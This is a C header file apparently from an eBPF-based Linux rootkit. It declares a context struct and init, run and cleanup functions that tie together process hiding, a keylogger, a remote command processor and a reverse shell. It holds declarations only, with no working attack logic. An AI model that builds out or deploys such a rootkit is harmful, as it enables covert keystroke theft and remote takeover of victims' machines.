#ifndef __ROOTKIT_H
#define __ROOTKIT_H

#include <bpf/libbpf.h>
#include <stdbool.h>

#include "userspace/command_processor.h"
#include "userspace/keylogger_processor.h"
#include "userspace/hider.h"
#include "userspace/loader.h"

typedef struct {
    struct rootkit *skel;
    const char *executable_name;
    pid_t reverse_shell_pid;

    hider_context_t hider_ctx;
    loader_context_t loader_ctx;
    command_processor_context_t command_processor_ctx;
    keylogger_context_t keylogger_ctx;

    struct ring_buffer *command_event_rb;
    struct ring_buffer *keylogger_event_rb;
    volatile bool running;
} application_context_t;

int rootkit_init(application_context_t *application_ctx, const char *exec_name);
int rootkit_run(application_context_t *application_ctx);
void rootkit_cleanup(application_context_t *application_ctx);

#endif /* __ROOTKIT_H */
